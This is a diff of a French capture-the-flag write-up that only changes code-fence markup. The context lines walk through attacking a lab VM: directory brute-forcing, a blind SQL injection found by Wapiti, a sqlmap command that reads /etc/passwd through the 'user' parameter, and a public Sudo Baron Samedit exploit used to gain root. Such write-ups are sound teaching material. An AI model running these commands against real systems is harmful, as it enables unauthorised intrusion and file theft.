@@ -17,7 +17,7 @@ Le nanard des CTF
 
 Un seul port ouvert, bien sûr un serveur Apache. Le site est une coquille vide et il faut tester un bon nombre de wordlists avant d’obtenir plus que le fichier *profile.php* et la page d'index. Mais, en testant tous les mots de la langue de Shakespeare, on découvre une page supplémentaire :  
 
-```plain
+```
 $ feroxbuster -u http://192.168.56.18/ -w /opt/hdd/downloads/tools/wordlists/english -x php,html,txt
 
 200       11l       27w      279c http://192.168.56.18/exploit.html
@@ -37,7 +37,7 @@ Il existe en fait un dossier *enter\_network* à la racine du site que personne 
 
 Là on découvre une page de login dont Wapiti découvre rapidement qu'elle est vulnérable à une faille d'injection SQL en aveugle :  
 
-```plain
+```
 ---
 Vulnérabilité d'injection SQL en aveugle dans http://192.168.56.18/enter_network/ via une injection dans le paramètre user
 Evil request:
@@ -54,7 +54,7 @@ A partir de là on joue un peu avec SQLmap. Forcément au vue de l'exploitation 
 
 Ceci ne nous amène là encore strictement nul part. Toutefois les requêtes sont faites avec l'utilisateur *root* ce qui nous permet de lire les scripts web sur le serveur (avec l'option *--file-read* de SQLmap).  
 
-```plain
+```
 python sqlmap.py -u "http://192.168.56.18/enter_network/" --data "user=zz&pass=zz&sub=SEND" -p user --dbms mysql --risk 3 --level 5  --technique=T --file-read=/etc/passwd --no-cast --time-sec=2
 ```
 
@@ -172,7 +172,7 @@ Si on boot la VM et que l'on sélectionne les options avancées on peut éditer 
 
 Comme dit plus tôt toute écriture sur le disque est vouée à l'échec en raison des permissions. Seul le fichier *profile.php* dispose de permissions qui autorisent sa réécriture mais un des prérequis de *SELECT INTO OUTFILE* est que le fichier ne doit pas déjà exister.  
 
-```plain
+```
 ┌──(root💀kali)-[/var/www/html]
 └─# ls -al /var/www/html 
 total 176
@@ -191,7 +191,7 @@ Soit l'auteur a choisit d'arrêter les frais à ce moment, soit il ne sait pas l
 
 On découvre d'ailleurs en fouillant sur la machine qu'aucune exploitation locale n'a été mis en place volontairement. Le système est tout de même vulnérable à la faille Sudo Baron Samedit :  
 
-```plain
+```
 ┌──(kali㉿kali)-[~/CVE-2021-3156-main]
 └─$ python exploit_nss.py 
 # id
